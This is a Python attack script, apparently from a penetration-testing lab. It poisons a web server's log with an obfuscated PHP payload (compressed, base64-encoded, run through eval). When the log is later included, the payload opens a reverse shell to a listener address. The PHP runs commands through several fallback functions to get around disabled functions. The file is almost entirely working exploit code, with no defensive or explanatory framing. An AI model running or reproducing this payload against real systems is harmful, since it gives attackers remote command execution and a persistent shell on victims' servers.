#!/usr/bin/python

import socket
import zlib
import base64

# compress data.
def gzdeflate(string):
    compressed_data = zlib.compress(string)[2:-4]
    return base64.b64encode(compressed_data)

# target connection
tip = "10.11.24.58"
tport = 80

# listener connection
ip = '10.11.0.178'
port = 80 

php = '''
    /*<?php /**/
      @error_reporting(0);
      @set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0);
      $dis=@ini_get('disable_functions');
      if(!empty($dis)){
        $dis=preg_replace('/[, ]+/', ',', $dis);
        $dis=explode(',', $dis);
        $dis=array_map('trim', $dis);
      }else{
        $dis=array();
      }
      
    $ipaddr=''' + "\"" + ip + "\"" +''';
    $port=''' + "\"" + str(port) + "\"" +''';

    if(!function_exists('rzqsBdlOqUCTB')){
      function rzqsBdlOqUCTB($c){
        global $dis;
        
      if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) {
        $c=$c." 2>&1\n";
      }
      $LYXRn='is_callable';
      $gkphA='in_array';
      
      if($LYXRn('shell_exec')and!$gkphA('shell_exec',$dis)){
        $o=shell_exec($c);
      }else
      if($LYXRn('proc_open')and!$gkphA('proc_open',$dis)){
        $handle=proc_open($c,array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes);
        $o=NULL;
        while(!feof($pipes[1])){
          $o.=fread($pipes[1],1024);
        }
        @proc_close($handle);
      }else
      if($LYXRn('exec')and!$gkphA('exec',$dis)){
        $o=array();
        exec($c,$o);
        $o=join(chr(10),$o).chr(10);
      }else
      if($LYXRn('passthru')and!$gkphA('passthru',$dis)){
        ob_start();
        passthru($c);
        $o=ob_get_contents();
        ob_end_clean();
      }else
      if($LYXRn('popen')and!$gkphA('popen',$dis)){
        $fp=popen($c,'r');
        $o=NULL;
        if(is_resource($fp)){
          while(!feof($fp)){
            $o.=fread($fp,1024);
          }
        }
        @pclose($fp);
      }else
      if($LYXRn('system')and!$gkphA('system',$dis)){
        ob_start();
        system($c);
        $o=ob_get_contents();
        ob_end_clean();
      }else
      {
        $o=0;
      }
    
        return $o;
      }
    }
    $nofuncs='no exec functions';
    if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){
      $s=@fsockopen("tcp://"+$ipaddr,$port);
      while($c=fread($s,2048)){
        $out = '';
        if(substr($c,0,3) == 'cd '){
          chdir(substr($c,3,-1));
        } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
          break;
        }else{
          $out=rzqsBdlOqUCTB(substr($c,0,-1));
          if($out===false){
            fwrite($s,$nofuncs);
            break;
          }
        }
        fwrite($s,$out);
      }
      fclose($s);
    }else{
      $s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
      @socket_connect($s,$ipaddr,$port);
      @socket_write($s,"socket_create");
      while($c=@socket_read($s,2048)){
        $out = '';
        if(substr($c,0,3) == 'cd '){
          chdir(substr($c,3,-1));
        } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
          break;
        }else{
          $out=rzqsBdlOqUCTB(substr($c,0,-1));
          if($out===false){
            @socket_write($s,$nofuncs);
            break;
          }
        }
        @socket_write($s,$out,strlen($out));
      }
      @socket_close($s);
    }
'''

data = gzdeflate(php)
payload = "<?php $payload =" + "'" + data + "'" +';' + "$val = gzinflate(base64_decode($payload));eval($val);?>" 

# sending log contamination HTTP request.

try:
    print "\n Sending evil encoded payload..."
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect=s.connect((tip,tport))
    request = payload + '\r\n\r\n'
    s.send(request)
    data = s.recv(1024)
    print 'Got Response: ' + data
    print "\nDone!.. Now Try to execute the php in the contaiminated log file!"
except:
    print "Could not connect to target machine..."

s.close()


